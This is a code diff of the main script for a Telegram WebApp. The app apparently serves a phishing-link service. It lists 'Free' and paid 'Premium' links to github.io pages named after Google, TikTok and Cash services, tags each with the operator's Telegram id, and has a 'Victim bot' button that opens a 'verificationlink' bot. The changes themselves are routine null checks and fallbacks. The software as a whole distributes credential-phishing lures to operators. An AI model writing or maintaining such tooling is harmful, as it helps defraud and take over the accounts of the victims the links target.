@@ -1,13 +1,20 @@
 // Telegram WebApp SDK init
-const tg = window.Telegram.WebApp;
-tg.ready();
+const tg = window.Telegram?.WebApp;
 
-// Store user info
+if (!tg) {
+  alert('⚠️ Please open this page inside the official Telegram app for full functionality.');
+}
+
+tg?.ready();
+
+// Store user info or fallback defaults
 const user = {
-  id: tg.initDataUnsafe?.user?.id || null,
-  username: tg.initDataUnsafe?.user?.username || 'Unknown',
-  first_name: tg.initDataUnsafe?.user?.first_name || 'User',
+  id: tg?.initDataUnsafe?.user?.id || null,
+  username: tg?.initDataUnsafe?.user?.username || 'Unknown',
+  first_name: tg?.initDataUnsafe?.user?.first_name || 'User',
 };
+
+console.log('Telegram user info:', user);
 
 // Elements
 const sections = {
@@ -95,42 +102,36 @@ const homeLinks = [
   {name: 'Link4', img: 'https://i.imgur.com/0JkkVu0.png', url: 'https://rrloaty.github.io/a/gma.html?id={telegram-id}'},
   {name: 'Link5', img: 'https://i.imgur.com/QXJ8MZ7.png', url: 'https://rrloaty.github.io/a/tiktok.html?id={telegram-id}'},
   {name: 'Link6', img: 'https://i.imgur.com/WHNz4cZ.png', url: 'https://rrloaty.github.io/a/cash.html?id={telegram-id}'},
-  // Add more here with comment:
-  // {name: 'LinkName', img: 'image_url', url: 'link_url?id={telegram-id}'},
 ];
 
 // Render Home Links
 function renderHome() {
   sections.home.innerHTML = '<h2>Free Links</h2>';
   homeLinks.forEach(link => {
-    const url = link.url.replace('{telegram-id}', user.id);
+    const url = link.url.replace('{telegram-id}', user.id ?? 'guest');
     const card = buildLinkCard(link.name, link.img, url);
     sections.home.appendChild(card);
   });
 
-  // Add comment area for adding more links (as HTML comment)
   sections.home.appendChild(document.createComment('Add more free links in the homeLinks array in main.js'));
 }
 
 // === Premium Section ===
 const premiumLinks = [
   {name: 'Premium 1', img: 'https://i.imgur.com/RWnzxHD.png', url: 'https://bbott52.github.io/Mobixhub/?promo={telegram-id}'},
-  // Add more premium links here:
-  // {name: 'Premium Link Name', img: 'image_url', url: 'premium_link?id={telegram-id}'},
 ];
 
 // Render Premium Section
 function renderPremium() {
   sections.premium.innerHTML = `<h2>Premium Links</h2>`;
 
-  if (premiumUserIds.includes(user.id)) {
+  if (user.id && premiumUserIds.includes(user.id)) {
     premiumLinks.forEach(link => {
       const url = link.url.replace('{telegram-id}', user.id);
       const card = buildLinkCard(link.name, link.img, url);
       sections.premium.appendChild(card);
     });
   } else {
-    // Not premium message with link to go premium bot
     const msg = document.createElement('p');
     msg.textContent = 'Go premium to view or copy these links. You can message ';
     const botLink = document.createElement('a');
@@ -147,25 +148,12 @@ function renderPremium() {
 
 // Victim bot button
 document.getElementById('open-victim-bot').addEventListener('click', () => {
-  // open https://t.me/intelligentverificationlinkbot with /start param via URL start=...
   const url = 'https://t.me/intelligentverificationlinkbot?start=start';
   window.open(url, '_blank');
 });
 
 // On load
 function init() {
-  if (!user.id) {
-    // Show friendly message if user id missing
-    sections.home.innerHTML = '<p style="padding:1em; color:#a00;">' +
-      'Unable to detect your Telegram user info. ' +
-      'Please open this WebApp inside the Telegram app.</p>';
-    sections.premium.innerHTML = '';
-    sections.victim.innerHTML = '';
-    sections.donate.innerHTML = '';
-    showSection('home');
-    return;  // Skip further rendering
-  }
-
   renderHome();
   renderPremium();
   showSection('home');
